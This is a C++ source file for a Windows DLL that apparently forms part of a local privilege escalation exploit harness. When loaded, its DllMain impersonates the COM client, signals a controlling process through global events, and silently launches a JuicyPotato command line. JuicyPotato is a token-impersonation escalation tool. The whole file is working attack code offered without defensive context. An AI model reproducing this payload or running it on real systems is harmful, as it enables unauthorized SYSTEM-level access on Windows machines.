#include <Windows.h>
#include <cstdint>

#include "../shared/defines.h"
#include "../shared/utils.h"

static uint8_t g_JuicyPotatoCommandLine[2048] = JUICY_POTATO_COMMAND_LINE_PATTERN;
HANDLE hPipe;

void NotifyMasterLoaded()
{
    CoImpersonateClient();
    HANDLE hNotifyEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, L"Global\\bthlpe_harnessloaded");
    if (hNotifyEvent)
    {
        SetEvent(hNotifyEvent);
        CloseHandle(hNotifyEvent);
    }
    RevertToSelf();
}

void NotifyMasterFinished()
{
    CoImpersonateClient();
    HANDLE hNotifyEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE,  L"Global\\bthlpe_harnessfinished");
    if (hNotifyEvent)
    {
        SetEvent(hNotifyEvent);
        CloseHandle(hNotifyEvent);
    }
    RevertToSelf();
}

bool StartJuicyPotato()
{
    return CreateRemoteProcess((const wchar_t*)g_JuicyPotatoCommandLine, CREATE_NO_WINDOW);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        NotifyMasterLoaded();
        if (StartJuicyPotato())
        {
            NotifyMasterFinished();
        }
        return FALSE;
    }
        break;
    default:
        break;
    }
    return TRUE;
}

